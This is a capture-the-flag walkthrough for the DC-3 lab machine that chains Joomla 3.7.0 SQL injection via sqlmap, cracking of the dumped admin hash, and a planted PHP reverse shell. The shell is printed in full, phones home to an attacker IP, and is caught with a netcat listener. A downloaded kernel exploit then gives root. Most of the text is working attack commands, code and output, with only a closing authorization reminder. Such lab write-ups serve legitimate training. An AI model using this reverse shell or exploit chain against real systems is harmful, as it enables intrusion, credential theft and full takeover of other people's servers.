# DC-3 Machine — Privilege Escalation Walkthrough

**Credits:**

**Rejaul Islam**  
_Security enthusiast_

............................................

1. Run the DC-3 machine in your virtual box.
2. Then, find the IP address of the DC-3 machine.

```bash
# Discover hosts on your LAN
sudo netdiscover
```

**Result:**

```bash
192.168.0.106   08:00:27:78:ca:51      1      60  PCS Systemtechnik GmbH
```

---

## Step 3 — Port & service discovery

```
# Scan the host for open ports & services (avoid aggressive scans on real networks)
nmap -A -v 192.168.0.106 or
nmap -sC -sV -n -v 192.168.0.106
```

**Result:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

We can see port `80` is open and an Apache server is running.

---

## Step 4 — Visit the web app

Open in your browser:

```
http://192.168.0.106
```

You should see an index page. Use Wappalyzer (or similar) — it shows **Joomla** CMS. Now scan with `joomscan`:

```
joomscan --url "http://192.168.0.106"
```

**Result (important lines):**

```
[+] Detecting Joomla Version
[++] Joomla 3.7.0
[+] admin finder
[++] Admin page : http://192.168.0.106/administrator/
```

We have the Joomla version (`3.7.0`) and the administrator login path.

---

## Step 5 — Find known vulnerabilities

Search for public exploits for Joomla 3.7.0:

```
searchsploit "Joomla 3.7.0"
```

**Result (notable entry):**

```
Joomla! 3.7.0 - 'com_fields' SQL Injection — php/webapps/42033.txt
```

Copy and inspect the exploit details:

```
# Copy exploit locally for review
searchsploit -m php/webapps/42033.txt
```

Exploit mentions a vulnerable URL pattern, e.g.:

```
URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
```

Try the vulnerable URL against the target to confirm SQL error / vulnerability presence.

---

## Step 6 — Use sqlmap to enumerate databases

Run `sqlmap` against the vulnerable parameter to list databases:

```
sqlmap -u "http://192.168.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p "list[fullordering]" --batch
```

**Result:**

```
available databases [5]:
[*] information_schema
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
```

---

## Step 7 — Enumerate tables in `joomladb`

```
sqlmap -u "http://192.168.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p "list[fullordering]" --batch
```

---

## Step 8 — Dump the Joomla users table

Target the users table (table prefix may vary; `#__users` used as an example):

```
sqlmap -u "http://192.168.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump -p "list[fullordering]" --batch
```

**Result (sample):**

```
name   | password
+--------+--------------------------------------------------------------+
| admin  | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```

We have the `admin` username and a password hash.

---

## Step 9 — Crack the Joomla hash with John

Save the hash into `hash.txt` and run John the Ripper with a wordlist:

```
john hash.txt --wordlist=/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

After cracking, view the result:

```
john hash.txt --show
```

**Result:**

```
?:snoopy
```

Now we have credentials: `username="admin"`, `password="snoopy"`.

---

## Step 10 — Login to Joomla admin

Visit the admin page:

```
http://192.168.0.106/administrator/
```

Login with:

```text
Username: admin
Password: snoopy
```

You should see the Joomla dashboard.

---

## Step 11 — Inject a PHP reverse shell via template editor

Navigate in Joomla: `Extensions` → `Templates` → `Templates` → open a template (e.g., `templates2`). Edit `index.php` and replace its contents with a PHP reverse shell (example below). **(Only in your authorized lab.)**

**Reverse shell code (example):**

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.124';  // Change to your attacker IP
$port = 4444;  // Change to your listener port
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
  $pid = pcntl_fork();
  if ($pid == -1) { printit("ERROR: Can't fork"); exit(1); }
  if ($pid) { exit(0); }
  if (posix_setsid() == -1) { printit("Error: Can't setsid()"); exit(1); }
  $daemon = 1;
} else {
  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { printit("$errstr ($errno)"); exit(1); }

$descriptorspec = array(
  0 => array("pipe", "r"),
  1 => array("pipe", "w"),
  2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { printit("ERROR: Can't spawn shell"); exit(1); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
  if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; }
  if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; }

  $read_a = array($sock, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

  if (in_array($sock, $read_a)) {
    if ($debug) printit("SOCK READ");
    $input = fread($sock, $chunk_size);
    if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);
  }

  if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug) printit("STDOUT: $input");
    fwrite($sock, $input);
  }

  if (in_array($pipes[2], $read_a)) {
    if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");
    fwrite($sock, $input);
  }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
  global $daemon;
  if (!$daemon) {
    print "$string\n";
  }
}
?>
```

Save the edited `index.php`.

---

## Step 12 — Start a netcat listener on your machine

```
# Start a listener on attacker machine
nc -lnvp 4444
```

---

## Step 13 — Trigger the reverse shell

Visit the site (index) to execute the injected code:

```
http://192.168.0.106/
```

You should receive a reverse shell on your netcat listener. Now you are a web user (usually `www-data` or similar).

---

## Step 14 — Privilege escalation reconnaissance

Move to `/tmp` and run enumeration (linpeas) or manual checks.

```
# Check target OS release
lsb_release -a
```

**Result:**

```
Ubuntu 16.04
```

Search for kernel/local exploits for Ubuntu 16.04:

```
searchsploit "Ubuntu 16.04"
```

**Result (example):**

```
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation | linux/local/39772.txt
```

---

## Step 15 — Download & compile the local exploit on the target

```
# On the target (in /tmp)
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
unzip 39772.zip
cd 39772
# You should see an exploit tar/dir
tar -xvf exploit.tar   # if present
cd ebpf_mapfd_doubleput_exploit
chmod +x compile.sh
./compile.sh
./doubleput
```

**After running `./doubleput` you should get a root shell.**

---

## Step 16 — Verify root & capture the flag

```
# In the escalated shell
whoami
# => root

cd /root
ls
cat the_flag.txt
```

**Sample banner & success message (from exploit output):**

```text
\ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)


Congratulations are in order. :-)
...
```

Now you are root and can read `final_flag.txt`.

---

## Final words

You have completed the privilege escalation for DC-3 and retrieved the final flag.

> **Reminder:** All of the above steps must be executed **only** in environments you own or have explicit permission to test (CTF, TryHackMe, VulnHub, your own VMs). Do **not** use these techniques on unauthorized systems.

--- THE END ---
